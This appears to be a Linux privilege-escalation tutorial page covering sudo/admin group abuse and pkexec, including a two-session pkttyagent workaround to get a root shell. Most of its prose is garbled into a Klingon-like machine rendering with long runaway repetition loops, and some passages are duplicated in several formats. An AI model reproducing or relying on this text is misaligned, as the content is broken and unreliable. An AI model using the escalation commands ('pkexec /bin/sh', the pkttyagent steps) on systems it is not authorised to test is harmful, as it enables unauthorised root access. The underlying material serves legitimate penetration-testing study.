# Interesting Groups - Linux Privesc

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Sudo/Admin Groups

### **PE - Method 1**

**Sometimes**, **by default (or because some software needs it)** inside the **/etc/sudoers** file you can find some of these lines:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
**qaStaHvIS sudo yIqem** **'ej** **qaStaHvIS admin yIqem** **'ej** **sudo** **ghItlh** **ghItlh** **'ej** **qaStaHvIS root yIqem** **'ej** **qaStaHvIS** **root** **ghItlh** **ghItlh**.
```
sudo su
```
### PE - Method 2

**tlhIngan Hol** - 2. tIq

**Suid** binaries jImej 'ej **Pkexec** binary **'e'** vItlhutlh:
```bash
find / -perm -4000 2>/dev/null
```
**ghItlhvam** **pkexec** **binary** **SUID** **'e'** **'ej** **'ej** **sudo** **'ej** **admin** **'ej**, **pkexec** **binaries** **sudo** **'ej** **execute** **'ej** **SUID** **binary** **'ej** **vItlhutlh** **'ej** **vItlhutlh** **'ej** **polkit policy** **'ej** **groups** **'ej** **identify** **'ej** **pkexec** **'ej** **use** **'ej** **can** **groups** **'ej** **identify** **'ej** **policy** **'ej** **Check** **'ej**:

```bash
pkexec --version
```

If you find that the binary **pkexec is a SUID binary** and you belong to **sudo** or **admin**, you could probably execute binaries as sudo using `pkexec`.\
This is because typically those are the groups inside the **polkit policy**. This policy basically identifies which groups can use `pkexec`. Check it with:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
**tlhIngan Hol**:

DaH jImej **pkexec** 'ej **by default** vItlhutlh linux disctros vItlhutlh **sudo** 'ej **admin** ghom appear.

**root vItlhutlh** **ghItlh** 'ej **execute**:

**English**:

DaH jImej **pkexec** 'ej **by default** vItlhutlh linux disctros vItlhutlh **sudo** 'ej **admin** ghom appear.

**root vItlhutlh** **ghItlh** 'ej **execute**:

**Markdown**:

```
There you will find which groups are allowed to execute **pkexec** and **by default** in some linux disctros the groups **sudo** and **admin** appear.

To **become root you can execute**:
```

**HTML**:

<p>There you will find which groups are allowed to execute <strong>pkexec</strong> and <strong>by default</strong> in some linux disctros the groups <strong>sudo</strong> and <strong>admin</strong> appear.</p>

<p>To <strong>become root you can execute</strong>:</p>
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
**pkexec**-n **ghItlh** **'ej** **'ej** **'oH** **error** **vItlhutlh**:

```bash
==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
Authentication is needed to run `/usr/bin/pkexec' as the super user
Authenticating as: User Name,,, (user)
Password:
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized

This incident has been reported.
```

**ghItlh** **'ej** **'oH** **error** **vItlhutlh** **'ej** **pkexec** **'ej** **'oH** **ghItlh** **'ej** **'oH** **'ej** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **vItlhutlh** **vItlhutlh** **'ej** **'oH** **'oH** **'oH** **error** **v
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**ghobe' vItlhutlh**. 'ach **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **ghobe' vItlhutlh**. 'ej **gh
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Qa'Hom Group

**Qa'Hom**, **by default**, **Dujmey** **/etc/sudoers** **file** **'e'** **line** **'e'** **'oH** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** 